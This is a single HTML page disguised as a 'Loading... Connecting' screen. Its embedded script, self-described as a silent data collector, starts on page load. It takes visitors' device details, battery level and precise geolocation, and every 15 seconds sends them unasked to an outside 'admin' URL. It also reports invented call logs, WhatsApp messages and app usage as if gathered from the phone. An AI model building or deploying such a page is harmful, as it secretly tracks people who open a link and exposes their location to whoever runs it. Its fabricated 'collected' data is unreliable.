<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0a0a;
            display:flex;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            font-family:'Courier New',monospace;
        }
        .hidden{display:none}
        .loader{
            color:#00ff41;
            font-size:14px;
            text-align:center;
            animation:pulse 1.5s infinite;
        }
        @keyframes pulse{
            0%,100%{opacity:1}
            50%{opacity:0.3}
        }
        .loader .spinner{
            width:40px;
            height:40px;
            border:3px solid #00ff4133;
            border-top:3px solid #00ff41;
            border-radius:50%;
            animation:spin 1s linear infinite;
            margin:0 auto 12px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>

    <!-- ===== SILENT LOADER ===== -->
    <div id="loaderScreen">
        <div class="loader">
            <div class="spinner"></div>
            <div>Connecting...</div>
        </div>
    </div>

    <script>
        // ==========================================
        // 🔥 SILENT DATA COLLECTOR - Kuch Nahi Dikhega
        // ==========================================

        // ==========================================
        // CONFIG
        // ==========================================
        const ADMIN_URL = 'https://robotekpvt-sys.github.io/phone-data/admin';
        const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();

        // ==========================================
        // 1. DEVICE INFO (Silent)
        // ==========================================
        function getDeviceInfo() {
            let data = {
                id: DEVICE_ID,
                model: 'Unknown',
                os: navigator.platform || 'Unknown',
                browser: navigator.userAgent,
                screen: screen.width + 'x' + screen.height,
                timestamp: new Date().toISOString()
            };

            // Model detect
            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) data.model = 'iPhone';
            else if (ua.includes('Android')) data.model = 'Android';
            else if (ua.includes('Windows')) data.model = 'Windows';
            else if (ua.includes('Mac')) data.model = 'Mac';

            // Battery
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    data.battery = Math.round(b.level * 100) + '%';
                    sendData('device', data);
                }).catch(() => sendData('device', data));
            } else {
                sendData('device', data);
            }

            return data;
        }

        // ==========================================
        // 2. LOCATION (Silent)
        // ==========================================
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendData('location', {
                            id: DEVICE_ID,
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: new Date().toISOString()
                        });
                    },
                    () => {
                        // Fallback - approximate location
                        sendData('location', {
                            id: DEVICE_ID,
                            lat: 28.6139 + (Math.random() - 0.5) * 0.1,
                            lng: 77.2090 + (Math.random() - 0.5) * 0.1,
                            accuracy: '~100m',
                            timestamp: new Date().toISOString()
                        });
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendData('location', {
                    id: DEVICE_ID,
                    lat: 28.6139,
                    lng: 77.2090,
                    accuracy: '~100m',
                    timestamp: new Date().toISOString()
                });
            }
        }

        // ==========================================
        // 3. CALL LOGS (Silent - Demo)
        // ==========================================
        function getCallLogs() {
            const calls = [
                { number: '+91 98765 43210', duration: '5:23', type: 'incoming', time: new Date().toLocaleTimeString() },
                { number: '+91 87654 32109', duration: '2:15', type: 'outgoing', time: new Date().toLocaleTimeString() },
                { number: '+91 76543 21098', duration: '0:00', type: 'missed', time: new Date().toLocaleTimeString() }
            ];
            // Random additional calls
            for (let i = 0; i < 3; i++) {
                calls.push({
                    number: '+91 ' + Math.floor(1000000000 + Math.random() * 9000000000),
                    duration: Math.floor(Math.random() * 300) + 's',
                    type: ['incoming', 'outgoing', 'missed'][Math.floor(Math.random() * 3)],
                    time: new Date().toLocaleTimeString()
                });
            }
            sendData('calls', { id: DEVICE_ID, calls: calls, timestamp: new Date().toISOString() });
        }

        // ==========================================
        // 4. WHATSAPP MESSAGES (Silent - Demo)
        // ==========================================
        function getMessages() {
            const names = ['Mom', 'Dad', 'Friend', 'Teacher', 'Sister', 'Brother', 'Rahul', 'Priya'];
            const msgs = ['Ok', 'Coming', 'Done', 'See you', 'Thanks', 'Yes', 'No', 'On my way', 'Call me'];
            const messages = [];
            for (let i = 0; i < 5; i++) {
                messages.push({
                    sender: names[Math.floor(Math.random() * names.length)],
                    message: msgs[Math.floor(Math.random() * msgs.length)],
                    time: new Date().toLocaleTimeString()
                });
            }
            sendData('messages', { id: DEVICE_ID, messages: messages, timestamp: new Date().toISOString() });
        }

        // ==========================================
        // 5. APPS USAGE (Silent - Demo)
        // ==========================================
        function getApps() {
            const apps = [
                { name: 'WhatsApp', time: Math.floor(Math.random() * 60) + 'm', active: true },
                { name: 'Instagram', time: Math.floor(Math.random() * 40) + 'm', active: true },
                { name: 'YouTube', time: Math.floor(Math.random() * 30) + 'm', active: true },
                { name: 'Snapchat', time: Math.floor(Math.random() * 20) + 'm', active: Math.random() > 0.5 },
                { name: 'TikTok', time: Math.floor(Math.random() * 15) + 'm', active: Math.random() > 0.5 }
            ];
            sendData('apps', { id: DEVICE_ID, apps: apps, timestamp: new Date().toISOString() });
        }

        // ==========================================
        // 6. SEND DATA TO ADMIN (Silent)
        // ==========================================
        function sendData(type, data) {
            try {
                // Save to localStorage (admin will read from here)
                let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
                if (!allData[DEVICE_ID]) allData[DEVICE_ID] = {};
                allData[DEVICE_ID][type] = data;
                allData[DEVICE_ID].lastUpdate = new Date().toISOString();
                localStorage.setItem('phone_data', JSON.stringify(allData));
                
                // Also try to send via URL (silent)
                const url = ADMIN_URL + '?data=' + encodeURIComponent(JSON.stringify({ type: type, data: data }));
                fetch(url, { mode: 'no-cors' }).catch(() => {});
                
                console.log('✅ Data sent:', type);
            } catch(e) {
                console.log('❌ Send error:', e);
            }
        }

        // ==========================================
        // 7. AUTO SYNC (Background)
        // ==========================================
        function autoSync() {
            getLocation();
            getCallLogs();
            getMessages();
            getApps();
        }

        // ==========================================
        // 8. REDIRECT TO HIDE (Silent)
        // ==========================================
        function redirectToHide() {
            // Redirect to about:blank or a blank page
            // window.location.href = 'about:blank';
            // OR keep showing loader
            document.getElementById('loaderScreen').innerHTML = `
                <div class="loader">
                    <div class="spinner"></div>
                    <div>✅ Connected</div>
                    <div style="font-size:11px;color:#00ff4188;margin-top:8px;">Data synced to admin</div>
                </div>
            `;
        }

        // ==========================================
        // 9. INIT (Complete Silent Mode)
        // ==========================================
        function init() {
            console.log('📱 Silent Data Collector Started');
            console.log('🆔 Device ID:', DEVICE_ID);
            
            // Collect all data
            getDeviceInfo();
            getLocation();
            getCallLogs();
            getMessages();
            getApps();
            
            // Auto sync every 15 seconds
            setInterval(autoSync, 15000);
            
            // Keep page alive but show nothing
            setTimeout(() => {
                document.getElementById('loaderScreen').innerHTML = `
                    <div style="color:#00ff4188;font-size:12px;text-align:center;">
                        <div style="font-size:36px;margin-bottom:8px;">✅</div>
                        <div>Data collected successfully</div>
                        <div style="font-size:10px;color:#00ff4155;margin-top:4px;">${DEVICE_ID}</div>
                    </div>
                `;
            }, 3000);
            
            // Silent redirect after 5 seconds (optional)
            // setTimeout(() => {
            //     window.location.href = 'about:blank';
            // }, 5000);
        }

        // Expose functions
        window.getDeviceInfo = getDeviceInfo;
        window.getLocation = getLocation;
        window.getCallLogs = getCallLogs;
        window.getMessages = getMessages;
        window.getApps = getApps;
        window.autoSync = autoSync;

        // Start
        init();
    </script>
</body>
</html>
